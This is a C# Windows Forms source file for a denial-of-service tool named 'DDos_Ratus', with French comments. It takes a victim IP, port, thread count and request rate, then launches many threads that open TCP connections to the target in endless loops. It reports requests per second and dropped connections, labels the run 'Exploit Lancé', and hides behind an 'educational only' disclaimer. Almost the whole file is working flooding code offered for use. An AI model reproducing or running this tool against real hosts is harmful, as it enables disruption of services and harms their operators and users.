using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DDos_Ratus
{
    public partial class Form1 : Form
    {
        private static List<Thread> threads = new List<Thread>();
        private string targetIP = string.Empty;
        private int targetPort = 0;
        private int numThreads = 0;
        private int requestsPerSecond = 0;
        private bool profile = true;
        private static int requestsCounter = 0;
        private static int dropCounter = 0;
        private static bool run_thread = false;

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        private static extern bool AllocConsole(); // Importe la méthode AllocConsole

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        private static extern bool FreeConsole(); // Importe la méthode FreeConsole
        public Form1()
        {
            InitializeComponent();

            this.FormBorderStyle = FormBorderStyle.FixedSingle; // Rendre la fenêtre non redimensionnable
            this.MaximizeBox = false; // Désactiver le bouton d'agrandissement

            string[] args = Environment.GetCommandLineArgs();

            if (args.Length >= 6)
            {
                
                targetIP = args[1];
                targetPort = int.Parse(args[2]);
                numThreads = int.Parse(args[3]);
                requestsPerSecond = int.Parse(args[4]);
                profile = bool.Parse(args[5]);
                if (!profile)
                {
                    AllocConsole();
                    //Console.WriteLine(targetIP + targetPort + numThreads + requestsPerSecond);
                    Console.WriteLine("<!><!>Ce Programme est UNIQUEMENT à titre éducatif, le développeur se décharge de toutes responsabilités\nL'utilisateur est pleinement conscient et informé du titre éducatif de ce programme.\nBy Ratus.\n");
                    Console.WriteLine("Récapitulatif:\nIp Victime : "+ targetIP+ "\nPort Victime : " + targetPort + "\nNombre de Threads : " + numThreads + "\nNombre de Requêtes : " + requestsPerSecond);
                    Console.WriteLine("\nEn appuyant sur une touche, vous acceptez d'être l'UNIQUE responsable de vos actes...\n\nCtrl+C  Pour annuler. ");
                    
                    Console.ReadKey(); // Attend une entrée du clavier 

                    if (IPAddress.TryParse(targetIP, out IPAddress ipAddress))
                    {
                        run_thread = true;

                        Initialise(targetIP, targetPort, numThreads, requestsPerSecond);

                        // Start a new thread to display the requests per second
                        Thread displayThread = new Thread(DisplayRequestsPerSecondConsole);
                        displayThread.Start();
                        while (true) { }
                    }
                    else
                    {
                        Console.WriteLine("[-] Erreur: Veuillez saisir une adresse IP valide.");
                    }
                }
            }


            Disclamer disclamer = new Disclamer();
            disclamer.ShowDialog();

            if (disclamer.DialogResult != DialogResult.OK)
            {
                Close();
                Application.Exit();
            }

            this.FormClosing += couille;
        }

        private void couille(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if (profile)
            {
                EnFome();
            }
        }

        static void Initialise(string targetIP, int targetPort, int numThreads, int requestsPerSecond)
        {
            
            int numRequests = 0;
            double interval = 1000.0 / requestsPerSecond;

            for (int i = 0; i < numThreads && run_thread; i++)
            {
                Thread thread = new Thread(() => LaunchAttack(targetIP, targetPort, numRequests, interval));
                threads.Add(thread);
                thread.Start();
            }
        }

        private void EnFome()
        {
            textBox1.Text = targetIP;
            numericUpDown1.Value = targetPort;
            numericUpDown2.Value = numThreads;
            numericUpDown3.Value = requestsPerSecond;
        }

        static void LaunchAttack(string targetIP, int targetPort, int numRequests, double interval)
        {
            Stopwatch stopwatch = Stopwatch.StartNew();

            while (true)
            {
                int i =0;
                try
                {
                    TcpClient client = new TcpClient(targetIP, targetPort);
                    client.Close();
                }
                catch (Exception)
                {
                    i++;
                }

                numRequests++;

                double elapsedMilliseconds = stopwatch.Elapsed.TotalMilliseconds;
                double remainingTime = interval - elapsedMilliseconds;

                if (remainingTime > 0)
                    Thread.Sleep((int)remainingTime);
                else
                    Thread.Yield();

                stopwatch.Restart();

                // Increase the requests counter
                Interlocked.Increment(ref requestsCounter);

                if (i > 0)
                {
                    dropCounter ++; 
                }
                
            }

        }

        private void button1_Click(Object sender, EventArgs e)
        {
            if (!run_thread)
            {
                if (IPAddress.TryParse(textBox1.Text, out IPAddress ipAddress))
                {
                    run_thread = true;

                    targetIP = ipAddress.ToString();
                    targetPort = (int)numericUpDown1.Value;
                    numThreads = (int)numericUpDown2.Value;
                    requestsPerSecond = (int)numericUpDown3.Value;

                    Initialise(targetIP, targetPort, numThreads, requestsPerSecond);

                    // Start a new thread to display the requests per second
                    Thread displayThread = new Thread(DisplayRequestsPerSecond);
                    displayThread.Start();
                    button1.Text = "Kill logiciel";
                    
                }
                else
                {
                    MessageBox.Show("Veuillez saisir une adresse IP valide.", "Erreur", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    Console.WriteLine("[-] Erreur: Veuillez saisir une adresse IP valide.");
                }
            }
            else
            {
                run_thread = false;
                Environment.Exit(0);
            }
        }

        private void DisplayRequestsPerSecond()
        {
            EnFormeConsole();
                
            while (true)
            {
                int currentdrop = Interlocked.Exchange(ref dropCounter, 0);
                int currentRequests = Interlocked.Exchange(ref requestsCounter, 0);
                // Utilisez Invoke pour mettre à jour le label sur le thread de l'interface utilisateur
                label9.Invoke((MethodInvoker)(() =>
                {
                    label9.Text = "[+] Requêtes " + currentRequests.ToString() + " /Sec";
                }));

                if(currentdrop > 0)
                {
                    label11.Visible = true;
                    label11.ForeColor = Color.Orange;
                    label11.BackColor = Color.Transparent;
                    label11.Invoke((MethodInvoker)(() => { label11.Text = "[!] Nombre de drop(s) de requetes\nsur la cible : " + currentdrop; }));
                }
                Console.WriteLine("[+] Requêtes: " + currentRequests.ToString() + " /Sec");
                Thread.Sleep(1000); // Refresh every second
            }
        }

        private void DisplayRequestsPerSecondConsole()
        {

            while (true)
            {
                int currentdrop = Interlocked.Exchange(ref dropCounter, 0);
                int currentRequests = Interlocked.Exchange(ref requestsCounter, 0);
                Console.WriteLine("[+] Requêtes: " + currentRequests.ToString() + " /Sec");

                if (currentdrop > 0)
                {
                    Console.WriteLine("[!] Nombre de drop(s) de requetes\nsur la cible : " + currentdrop);
                }
                Thread.Sleep(1000); // Refresh every second
            }
        }

        private void EnFormeConsole()
        {
            label9.ForeColor = Color.Green;
            label9.BackColor = Color.Transparent;
            label10.ForeColor = Color.Green;
            label10.BackColor = Color.Transparent;
            label10.Invoke((MethodInvoker)(() => { label10.Text = "[+] Exploit Lancé..."; label10.Visible = true; }));
            label9.Invoke((MethodInvoker)(() => { label9.Visible = true; }));
            label12.Invoke((MethodInvoker)(() => { label12.Visible = false; }));
            Console.WriteLine("[+] Exploit Lancé...");

        }

       

        private void label8_Click(object sender, EventArgs e)
        {

        }

        private void label11_Click(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Renseignez les differentes textes box.\nIp De la victime = 00.000.000.00\nPort=xxxx\nThread=Max ~= 500\nRequetes = Max ~= 600\n\n\n<!><!>[!] Nombre de drop(s) de requetes = Erreur Cumulée recu de retour de requetes. \nCela peut etre du à la connexion ddos de la victime ou un pare-feu d'activé.\nA Savoir qu'il est possible qu'un processus bride ses propres requêtes.", "Aide", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void button3_Click(object sender, EventArgs e)
        {
           nmap_cmd nmap_Cmd = new nmap_cmd();  
           nmap_Cmd.ShowDialog();
           
        }
    }
}
